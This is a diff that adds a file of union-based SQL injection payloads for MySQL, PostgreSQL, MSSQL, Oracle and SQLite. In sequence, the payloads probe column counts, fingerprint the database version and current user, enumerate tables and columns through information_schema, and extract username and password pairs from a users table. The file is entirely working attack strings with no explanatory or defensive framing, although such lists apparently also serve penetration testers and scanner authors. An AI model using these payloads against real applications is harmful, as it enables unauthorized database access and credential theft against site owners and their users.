@@ -1,0 +1,33 @@
+# Union-Based SQL Injection Payloads
+# Targets: MySQL, PostgreSQL, MSSQL, Oracle, SQLite
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+1 UNION SELECT NULL--
+1 UNION SELECT NULL,NULL--
+1 UNION ALL SELECT NULL,NULL,NULL--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT @@version,NULL--
+' UNION SELECT @@version,NULL,NULL--
+' UNION SELECT user(),NULL--
+' UNION SELECT database(),NULL--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns--
+' UNION SELECT username,password FROM users--
+' UNION SELECT username,password,NULL FROM users--
+' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--
+' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT NULL,@@datadir--
+' UNION SELECT NULL,version()--
+' UNION SELECT NULL,current_user()--
+' UNION SELECT NULL,NULL FROM dual--
+' UNION SELECT NULL,banner FROM v$version--
